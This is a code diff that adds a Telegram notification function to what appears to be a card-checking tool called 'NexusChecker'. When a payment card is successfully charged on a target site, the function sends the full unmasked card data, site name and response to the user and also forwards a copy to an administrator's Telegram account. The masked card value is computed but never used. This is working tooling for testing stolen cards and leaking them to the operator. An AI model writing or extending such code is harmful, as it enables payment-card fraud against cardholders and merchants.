@@ -217,6 +217,46 @@ function getWebAppUrl(): string {
   return `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
 }
 
+export async function sendChargedCardNotification(
+  userTelegramId: string, 
+  card: string, 
+  siteName: string,
+  message: string
+): Promise<boolean> {
+  if (!BOT_TOKEN) return false;
+  
+  const cardParts = card.split('|');
+  const maskedCard = cardParts[0] 
+    ? `${cardParts[0].substring(0, 6)}****${cardParts[0].slice(-4)}` 
+    : card.substring(0, 10);
+  
+  const notificationText = `
+<b>CHARGED CARD</b>
+
+<b>Card:</b> <code>${card}</code>
+<b>Site:</b> ${siteName}
+<b>Response:</b> ${message}
+
+<i>Powered by NexusChecker</i>
+  `;
+  
+  await sendMessage(userTelegramId, notificationText);
+  
+  if (ADMIN_ID && ADMIN_ID !== userTelegramId) {
+    const adminText = `
+<b>NEW CHARGE</b>
+
+<b>User:</b> <code>${userTelegramId}</code>
+<b>Card:</b> <code>${card}</code>
+<b>Site:</b> ${siteName}
+<b>Response:</b> ${message}
+    `;
+    await sendMessage(ADMIN_ID, adminText);
+  }
+  
+  return true;
+}
+
 async function sendMessage(chatId: number | string, text: string): Promise<boolean> {
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
